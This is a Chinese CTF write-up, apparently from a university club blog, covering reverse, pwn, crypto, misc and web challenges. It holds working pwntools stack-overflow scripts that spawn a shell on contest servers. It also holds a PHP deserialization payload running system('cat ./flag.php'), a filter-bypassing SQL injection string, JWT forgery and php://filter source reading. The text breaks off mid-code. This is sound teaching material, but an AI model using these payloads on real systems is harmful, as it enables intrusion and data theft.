class="number">808</span>,<span class="number">792</span>,<span class="number">392</span>,<span class="number">424</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">384</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">840</span>,<span class="number">872</span>,<span class="number">896</span>,<span class="number">864</span>,<span class="number">808</span>,<span class="number">1000</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">i ^= <span class="number">0x10</span></span><br><span class="line">i -= <span class="number">0x10</span></span><br><span class="line">flag += chr(i &gt;&gt; <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag{Re_15_S0ooooooooo_Simple}</p><h3 id="0x01-ez-py"><a href="#0x01-ez-py" class="headerlink" title="0x01.ez_py"></a>0x01.ez_py</h3><p>出题人：0bs3rver</p><p>这题旨在让大家了解基本的py知识。</p><p>拿到题目可以看到是.pyc文件，百度可知这是.py文件编译后的产物，再次百度找到反编译网站，扔进去即可得到原py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">16</span></span><br><span class="line">        x = x + <span class="number">5</span></span><br><span class="line">        flag += chr(x)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">'qwLrfD;`JU`~"JY&gt;pOJ_;J,OOJZypJw&lt;ypJZqJ.;Oph'</span></span><br></pre></td></tr></table></figure><p>这题甚至不用逆向，只需要加上一行 print(encode(message)) 即可</p><p>flag{Y0u_Jus7_N3ed_T0_Add_One_l1ne_Of_C0de}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x00-just-run"><a href="#0x00-just-run" class="headerlink" title="0x00 . just_run"></a>0x00 . just_run</h3><p>​    登录Ubuntu，ctrl + alt +T打开终端。</p><p>​    输入命令：nc 121.41.113.245 10002</p><p>​    得到如下界面：</p><p><img src="https://s1.ax1x.com/2020/05/02/JvrxMD.png" alt="JvrxMD.png"></p><p>​    然后啥也没有了。。。。</p><p>​    反汇编分析一下：</p><p>​    打开64位ida，将题目的附件(ELF文件)拖到ida中打开，默认选第一个，确定。</p><p><img src="https://s1.ax1x.com/2020/05/02/JvsSqH.png" alt="JvsSqH.png"></p><p>​    左边是主要函数，我们双击main，按F5，得到反汇编的伪代码。</p><p><img src="https://s1.ax1x.com/2020/05/02/JvsPII.png" alt="JvsPII.png"></p><p><img src="https://s1.ax1x.com/2020/05/02/JvsCdA.png" alt="JvsCdA.png"></p><p>​    不管选择y还是n，都会直接执行system(“/bin/sh”);这行代码等同于在远程终端中执行“/bin/sh”。</p><p>​    因此执行该代码后，我们可以直接执行命令：cat flag.txt，得到flag。</p><p><img src="https://s1.ax1x.com/2020/05/02/JvrXRK.png" alt="JvrXRK.png"></p><p>​    flag{294dbf32-54ea-4c2f-a0d3-e3221df75913}</p><h3 id="0x01-2048"><a href="#0x01-2048" class="headerlink" title="0x01 . 2048"></a>0x01 . 2048</h3><p>​    本题用到了<a href="https://segmentfault.com/a/1190000007977460" target="_blank" rel="noopener">栈帧基础知识</a>。</p><p>​    同上，执行nc 121.41.113.245 10000</p><p><img src="https://s1.ax1x.com/2020/05/02/JvsARf.png" alt="JvsARf.png"></p><p>​    是个小游戏，要拿到10000分才能拿到flag。</p><p>​    用ida64反汇编附件，虽然函数有点多，不过发现如下关键代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v7 &lt;= <span class="number">9999</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)off_401B80 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x41</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x61</span>u:</span><br><span class="line">        move_left_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x44</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x64</span>u:</span><br><span class="line">        move_right_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x51</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x71</span>u:</span><br><span class="line">        you_quit();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x53</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x73</span>u:</span><br><span class="line">        move_down_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x57</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x77</span>u:</span><br><span class="line">        move_up_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  your_flag(v6);</span><br></pre></td></tr></table></figure><p>​    也就是说，程序用v7变量记录分数，超过10000分就会退出循环，执行you_flag()函数。    </p><p>​    由前面代码可见，buf变量通过read函数读入，而且读取长度为0x200，所以可能发生溢出。</p><p>​    我们知道，函数中的局部变量都会存在栈上，如果read函数中对buf输入的长度过长，就会覆盖栈上的其他变量，比如说v7。</p><p>​    光标放在变量上:</p><p><a href="https://imgchr.com/i/JvsZQS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsZQS.png" alt="JvsZQS.png"></a></p><p><img src="https://s1.ax1x.com/2020/05/02/Jvsesg.png" alt="Jvsesg.png"></p><p>​    发现两者距离栈底(即rbp)的偏移分别为：-0xF和-0x4。</p><p>​    也就是说，我们在buf中先输入11(0xF-0x4 = 0xB)个字节来填满数组，然后再输入10000，就会将v7变量修改成10000分。然后就能跳出游戏循环，执行you_flag()函数。</p><p>​    脚本如下，需要先额外安装一个python库，<a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">pwntools</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment">#使用pwntools库</span></span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10000</span>)<span class="comment">#远程连接</span></span><br><span class="line">p.recvuntil(<span class="string">"Well,R U a true player?[Y/N]"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0xB</span></span><br><span class="line">payload += p64(<span class="number">10000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag：flag{a1cbd38a-d468-440d-b623-6214aad97f68}</p><h3 id="0x02-joke"><a href="#0x02-joke" class="headerlink" title="0x02 . joke"></a>0x02 . joke</h3><p>​    本题也用到了<a href="https://segmentfault.com/a/1190000007977460" target="_blank" rel="noopener">栈帧基础知识</a>。</p><p>​    丢ida64，程序流程还挺简单。</p><p>​    选1听笑话没p用😁😁😁。</p><p><a href="https://imgchr.com/i/JvsmLQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsmLQ.png" alt="JvsmLQ.png"></a></p><p>​    漏洞在input函数，和2048一样，read函数存在溢出。</p><p><a href="https://imgchr.com/i/JvsuZj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsuZj.png" alt="JvsuZj.png"></a></p><p>​    而且程序中有一个mistake函数，从来没有用到过，而mistake函数执行了我们想要的system(“/bin/sh”)。</p><p><a href="https://imgchr.com/i/Jvs9Zd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/Jvs9Zd.png" alt="Jvs9Zd.png"></a></p><p>​    而mistake的地址是:0x40089C。</p><p><a href="https://imgchr.com/i/JvsFit" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsFit.png" alt="JvsFit.png"></a></p><p>​    可以考虑用上题相同的栈溢出和ROP，将input函数的返回地址改成mistake地址。</p><p>​    而后系统执行完input函数，发现栈上的返回地址被改成了mistake函数的地址，也就直接执行mistake函数了。</p><p>​    脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'121.41.113.245'</span>,<span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What do you say?"</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x30</span><span class="comment">#填充栈空间</span></span><br><span class="line">payloda+=p64(<span class="number">0</span>)<span class="comment">#填充旧的rbp(32位为ebp)</span></span><br><span class="line">payload+=p64(<span class="number">0x40089C</span>) <span class="comment">#覆盖input函数返回地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag：flag{3ae15963-fd5c-464c-ba30-299cc5a4e481}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x00-base64"><a href="#0x00-base64" class="headerlink" title="0x00 . base64"></a>0x00 . base64</h3><p>​        提示为IMG，这题是base64转图片(<a href="http://tool.chinaz.com/tools/imgtobase/" target="_blank" rel="noopener">在线工具</a>)。</p><p>​        解得如下图片：</p><p><img src="https://s1.ax1x.com/2020/05/02/JvskJP.png" alt="JvskJP.png"></p><p>​        题目中另外还有一个压缩包，而上述图片是解压密码。</p><p>​        解压后打开flag.txt，将字符串base64解码。</p><p>​        得到：flag{1s_my_p4ssword_t0o_5imple_?}</p><h3 id="0x01-兔老大"><a href="#0x01-兔老大" class="headerlink" title="0x01 . 兔老大"></a>0x01 . 兔老大</h3><p>提示就是Rabbit加密，密钥就是rabbit</p><p>解密过后，base32解码，拿到flag</p><h3 id="0x02-easy-caesar"><a href="#0x02-easy-caesar" class="headerlink" title="0x02.easy_caesar"></a>0x02.easy_caesar</h3><p>出题人：0bs3rver</p><p>根据题目及其描述可以看出利用了凯撒加密，但是给出的文档是一串大小写字母+符号的字符串，而凯撒加密是仅仅只有字母的。</p><p>可以联想到是不是在别的地方使用了移位，而最容易把这些东西串联起来的，就是ASCII码，在计算机中的字符一般都是使用ASCII码值进行存储，再联想到经典的凯撒加密算法是移动3位，所以可以写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caesar = <span class="string">']p&#123;k]|X6TmI3MWL6f4&lt;J\Zv&#125;[3QkP6Qkfo&lt;GP[Er][LoQ3T@'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> caesar:</span><br><span class="line">flag += chr(ord(i)<span class="number">-3</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>但是解开并不是flag字符串，细细观察后面还有 = 符号，很容易联想到ctf中最常见的编码格式–base64，解密即可get flag。</p><p>flag{1t’s_Fak3_Ca3sar_C1pher}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-Where-am-I"><a href="#0x00-Where-am-I" class="headerlink" title="0x00 . Where_am_I"></a>0x00 . Where_am_I</h3><p>​        这一题的灵感来自2019年10月24日菜鸟教程公众号，以及Nazo_game网站。</p><p>​        打开图片，下方提示了RGB，分别对应了度分秒，而且north和west也比较明确的提示了，这题和地理经纬度有关。</p><ul><li><p>登录pc端QQ，ctrl + alt + A，光标放在两个色块上即可知道north对应色块rgb为（40,41,21），west的rgb为（74,2,40）。</p><p><img src="https://s1.ax1x.com/2020/05/02/Jvrzse.png" alt="Jvrzse.png"></p></li><li><p>跟方向对应起来就是40°41′21″N 74°02′40″W。</p></li><li><p>上Google Earth搜索(注意<a href="https://support.google.com/maps/answer/18539?co=GENIE.Platform%3DDesktop&hl=zh-Hans" target="_blank" rel="noopener">搜索语法</a>)，得到位置为自由女神像。</p></li></ul><p>​        得到：flag{statue_of_liberty}</p><h3 id="0x01-古老的计算机"><a href="#0x01-古老的计算机" class="headerlink" title="0x01 . 古老的计算机"></a>0x01 . 古老的计算机</h3><p>将图片放到winhex中，可以发现图片最下方存在很多…. ..</p><p>根据题目古老的计算机，联想到2进制</p><p>将….转换成1，..转换成0</p><p>然后将二进制转换成字符串，拿到flag</p><h3 id="0x02-double-flag"><a href="#0x02-double-flag" class="headerlink" title="0x02.double_flag"></a>0x02.double_flag</h3><p>出题人：0bs3rver</p><p>这题下载下来是一个zip文件，但是解压会报错，我们可以联想到是不是文件出了什么问题（当然不是出题人弄错了…），用十六进制打开文件查看，发现前面少了zip头 504B0304 ，添加进去即可打开文件。</p><p>打开后是两张图片，可以看到第二张图片和第一张一样但是有很明显的修改痕迹，可以联想到是修改了十六进制下的内容。搜索 flag或者是一一对比可以发现第一处不同在0x400，第二次不同在0x800，第三次在0x1000，很明显是个数列，同时第一次以后的不同就是竖向排列了（这里这样设置是为了让肉眼寻找的同学有一线生机…），即可得到flag。</p><p>同时更推荐的方法是用工具进行对比，例如Beyond Compare，可以方便的对比各种文件，这里用十六进制比较打开两张图片，即可轻松get flag。</p><p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-4.png" alt=""></p><p>flag{1t’s_Imp0rtan7_To_Pr0t3ct_Your_Eye5}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUST内部赛（儿童节）wp</title>
      <link href="2020/06/01/s1rtwo_tp/"/>
      <url>2020/06/01/s1rtwo_tp/</url>
      
        <content type="html"><![CDATA[<p>WUST第二次内部赛 Writeup（儿童节快乐）</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>访问页面：</p><p><img src="https://s1.ax1x.com/2020/05/31/t3S4JS.png" alt="t3S4JS.png"></p><p>猜密码，第一反应就是爆破，查看一下Hint</p><p><img src="https://s1.ax1x.com/2020/05/31/t3SqZq.png" alt="t3SqZq.png"></p><p>4位纯数字，开不开心，高不高兴，直接爆破（手动输入也行，我没意见）</p><p><img src="https://s1.ax1x.com/2020/05/31/t3SvJU.png" alt="t3SvJU.png"></p><p><img src="https://s1.ax1x.com/2020/05/31/t3p9y9.png" alt="t3p9y9.png"></p><p>1314，输入进去，拿到flag</p><p><img src="https://s1.ax1x.com/2020/05/31/t3pie1.png" alt="t3pie1.png"></p><h3 id="我已备份好文件"><a href="#我已备份好文件" class="headerlink" title="我已备份好文件"></a>我已备份好文件</h3><blockquote><p>根据上次的反馈，因此特地加了这道送分题。</p></blockquote><p>题目说备份文件，发现是php，那就尝试常见的源码泄露的点，可以参考协会 <code>wiki</code> 另一篇文章的点：<code>https://wiki.w-ais.cn/2019/07/14/Web-In-CTF/#备份文件源码泄漏</code></p><p>访问 <code>index.php.bak</code> 拿到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">./flag.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaveFun</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Enjoy;</span><br><span class="line"><span class="keyword">public</span> $Happy;</span><br><span class="line"><span class="keyword">public</span> $keyboard;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($value1,$value2)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Enjoy = $value1;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Happy = $value2;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; <span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>, <span class="keyword">$this</span>-&gt;keyboard))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;keyboard = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;keyboard;</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;keyboard);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'happy'</span>]))&#123;</span><br><span class="line">unserialize($_POST[<span class="string">'happy'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个简单的反序列化，绕过 <code>__wakeup()</code> 就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaveFun</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Enjoy;</span><br><span class="line"><span class="keyword">public</span> $Happy;</span><br><span class="line"><span class="keyword">public</span> $keyboard;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>, <span class="keyword">$this</span>-&gt;keyboard))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;keyboard = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;keyboard;</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;keyboard);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> HaveFun();</span><br><span class="line">$a-&gt;keyboard = <span class="string">"system('cat ./flag.php');"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:7:"HaveFun":3:&#123;s:5:"Enjoy";N;s:5:"Happy";N;s:8:"keyboard";s:25:"system('cat ./flag.php');";&#125;</span></span><br></pre></td></tr></table></figure><p>漏洞原理：当反序列化字符串中，表示属性个数的值大于其真实值(这里&gt;3)，则跳过 <code>__wakeup()</code> 执行。</p><p><code>O:7:&quot;HaveFun&quot;:4:{s:5:&quot;Enjoy&quot;;N;s:5:&quot;Happy&quot;;N;s:8:&quot;keyboard&quot;;s:25:&quot;system(&#39;cat ./flag.php&#39;);&quot;;}</code></p><p>漏洞影响版本：</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>传参，拿到flag</p><p><img src="https://s1.ax1x.com/2020/05/31/t3pFdx.png" alt="t3pFdx.png"></p><p>参考链接：</p><p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrsm1th/p/6835592.html</a></p><h3 id="有点像甜饼"><a href="#有点像甜饼" class="headerlink" title="有点像甜饼"></a>有点像甜饼</h3><p><img src="https://s1.ax1x.com/2020/05/31/t3pko6.png" alt="t3pko6.png"></p><p>一个登录界面，随便输入一些东西，会发现页面没什么变化，看一下Hint</p><p>提示说admin：那就admin进去</p><p><img src="https://s1.ax1x.com/2020/05/31/t3pEFK.png" alt="t3pEFK.png"></p><p>返回这样，密码改为2，会发现有一点不同的回显；</p><p>看看cookie：</p><p><img src="https://s1.ax1x.com/2020/05/31/t3pVJO.png" alt="t3pVJO.png"></p><p>这一看就是JWT，不用想了，找key</p><p>登录框能有什么漏洞，测试一下sql注入，发现密码框存在注入点；</p><p>fuzz一下，过滤了空格，引号（盲猜数字型输入，因为过滤了引号嘛）</p><p>常规的union注入即可，将空格换成/**/即可绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;passwd&#x3D;1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(hint_key)&#x2F;**&#x2F;from&#x2F;**&#x2F;hint)#</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/31/t3psYT.png" alt="t3psYT.png"></p><p>拿到密钥去 <code>https://jwt.io/</code> 进行更改，然后 cookie 伪造一下，拿到 flag：</p><p><img src="https://s1.ax1x.com/2020/05/31/t3p0wq.png" alt="t3p0wq.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJwZXJtaXNzaW9uIjoidHJ1ZSJ9.Ze4cQbeD2BMP9S5CmidQ6UrszaRBlm7aaR7opHh_nzk</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/31/t3pXnA.png" alt="t3pXnA.png"></p><p>另外这题还有一个非预期解，由于出题人的疏忽，题目环境自带的 <code>phpmyadmin</code> 并没有处理掉，直接进入 <code>phpmyadmin</code> 用初始密码登陆就能直接看数据库了。</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601010515.png" alt="image-20200601010515131"></p><p>参考链接：</p><p><a href="https://www.freebuf.com/column/170359.html" target="_blank" rel="noopener">https://www.freebuf.com/column/170359.html</a></p><h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><blockquote><p>Author: 这道题目出着是想理解一下渗透的流程，算比较用心地去出题，比较遗憾，因为严格意义上来说没有人解出来，准备了很多 <code>hint</code>，但感觉前面没做到，后面的提示好像也派不上用场，灵感来自空指针的一次内部赛，那个比较难。这次主要考点还是在文件上传(内部训练)，后面的渗透比较刻意地去设置，也不算太难，过了文件上传有 <code>hint</code> 都可以秒解，题目比较贴心地给你准备好了一切，都是基本操作，主要是想熟悉 <code>nmap</code> 的基本使用及内网探测与爆破。</p></blockquote><p>打开网页，一个文件上传，上传图片，会将图片显示出来，然后出现了两个不知道为什么会存在的东西：两首歌的歌词，注意到 <code>url</code> 发现有文件包含，<code>http://47.110.130.169:10001/view.php?article=song.php</code>，可以利用它来包含文件🐎，但同时也可以用伪协议读源码(这里没有过滤)，提示 <code>flag</code> 在 <code>/flag</code>，如果真的在，那么伪协议就能读 <code>flag</code> 了，这题就不用做了。</p><p><code>http://47.110.130.169:10001/view.php?article=php://filter/convert.Base64-encode/resource=index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Can you bypass?&lt;/title&gt;</span><br><span class="line">I have already give you shell, this challenge is too easy.</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=<span class="string">"/index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upload_file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        $image_type = exif_imagetype($filename);</span><br><span class="line">        <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">            <span class="keyword">case</span> 